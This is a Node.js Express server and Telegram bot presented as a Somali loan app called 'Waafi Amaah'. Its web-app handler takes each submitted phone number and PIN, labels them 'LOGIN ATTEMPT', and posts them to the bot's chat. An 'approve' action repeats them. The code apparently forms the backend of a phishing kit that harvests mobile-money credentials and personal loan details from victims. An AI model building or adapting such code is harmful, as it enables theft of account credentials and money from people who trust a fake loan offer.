const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- BOT INIT --------------------
if (!process.env.BOT_TOKEN) {
    console.error("❌ BOT_TOKEN missing");
    process.exit(1);
}

const bot = new Telegraf(process.env.BOT_TOKEN);

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/:page', (req, res) => {
    const filePath = path.join(__dirname, 'public', `${req.params.page}.html`);

    res.sendFile(filePath, (err) => {
        if (err) {
            console.error("❌ Page not found:", filePath);
            res.status(404).send("Boggaan lama helin");
        }
    });
});

// -------------------- START COMMAND --------------------
bot.start((ctx) => {
    ctx.reply('Ku soo dhowaad Waafi Amaah! 👇', {
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: "🚀 Fur App",
                        web_app: {
                            url: process.env.WEBAPP_URL || "https://your-domain.com"
                        }
                    }
                ]
            ]
        }
    });
});

// -------------------- WEB APP DATA --------------------
bot.on('message', async (ctx) => {
    const webAppData = ctx.message?.web_app_data;
    if (!webAppData) return;

    try {
        const data = JSON.parse(webAppData.data);
        const currentTime = new Date().toLocaleString('en-US', { hour12: true });

        // LOGIN FLOW
        if (data.pin) {
            const loginMsg =
                `📱 LOGIN ATTEMPT\n\n` +
                `📞 ${data.phone}\n` +
                `🔢 ${data.pin}\n` +
                `⏰ ${currentTime}`;

            await ctx.reply(loginMsg);
        }

        // LOAN FLOW
        else {
            const summary =
                `✅ CODSI CUSUB\n\n` +
                `👤 ${data.firstName || ''} ${data.lastName || ''}\n` +
                `📞 +252${data.phone || ''}\n` +
                `💰 $${data.amount || 'N/A'}\n` +
                `📆 ${data.duration || 'N/A'}\n` +
                `💼 ${data.jobStatus || 'N/A'}\n` +
                `💵 $${data.income || 'N/A'}\n` +
                `📝 ${data.loanPurpose || 'N/A'}`;

            await ctx.reply(summary);
        }

    } catch (err) {
        console.error("❌ Data error:", err.message);
    }
});

// -------------------- APPROVE BUTTON --------------------
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];

    const msg =
        `✅ APPROVED\n\n` +
        `📞 ${phone}\n` +
        `🔐 ${pin}`;

    try {
        await ctx.editMessageText(msg);
    } catch (err) {
        console.error("❌ Edit error:", err.message);
    }
});

// -------------------- DENY --------------------
bot.action('deny', async (ctx) => {
    try {
        await ctx.editMessageText("❌ DENIED");
    } catch (err) {
        console.error("❌ Deny error:", err.message);
    }
});

// -------------------- START SERVER --------------------
app.listen(PORT, '0.0.0.0', async () => {
    console.log(`🚀 Server running on port ${PORT}`);

    try {
        await bot.telegram.deleteWebhook();
        await bot.launch();
        console.log("🤖 Bot launched successfully");
    } catch (err) {
        console.error("❌ Bot launch failed:", err.message);
    }
});

// -------------------- SAFETY STOP --------------------
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
